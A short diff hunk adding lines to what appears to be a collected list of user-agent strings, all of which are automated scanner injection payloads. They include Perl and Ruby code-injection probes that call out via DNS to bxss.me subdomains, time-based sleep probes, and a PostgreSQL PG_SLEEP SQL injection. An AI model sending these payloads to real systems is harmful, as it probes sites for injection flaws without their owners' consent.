@@ -881,3 +881,5 @@ geth(ostbyname(lc('hitdg'.'edfipfnvc57a7.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""&&sleep(27*1000)*wnfyrl&&"")
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'&&sleep(27*1000)*ktaqhe&&')
 '.gethostbyname(lc('hitij'.'qbowzxuk9bb77.bxss.me.').'A'.chr(67).chr(hex('58')).chr(97).chr(70).chr(119).chr(82).')
+""+""A"".concat(70-3.concat(22*4).concat(110).concat(88).concat(97).concat(88)+(require""socket"" Socket.gethostbyname(""hittn""+""ouhmqahs8c510.bxss.me."")[3].to_s)+"")
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.3658TRerFk' OR 663=(SELECT 663 FROM PG_SLEEP(15))--)
